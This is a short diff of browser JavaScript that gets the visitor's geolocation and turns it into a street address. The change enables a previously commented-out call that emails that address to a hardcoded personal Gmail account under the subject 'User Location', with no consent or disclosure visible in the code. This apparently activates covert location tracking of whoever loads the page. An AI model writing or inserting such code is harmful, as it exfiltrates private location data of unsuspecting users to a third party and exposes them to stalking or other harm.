@@ -1,5 +1,4 @@
 function getLocation() {
-    // emailjs.init('BpiGrXi6jmGAU66nc');
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(showLocation);
     } else {
@@ -21,7 +20,7 @@ function getLocation() {
             console.log('Address: ' + data.display_name);
             let address = data.display_name
             console.log(address)
-            // sendAddressEmail('henryvitus543@gmail.com', 'User Location', `My address is: ${address}`);
+             sendAddressEmail('henryvitus543@gmail.com', 'User Location', `My address is: ${address}`);
         } else {
             console.log('No results found');
         }
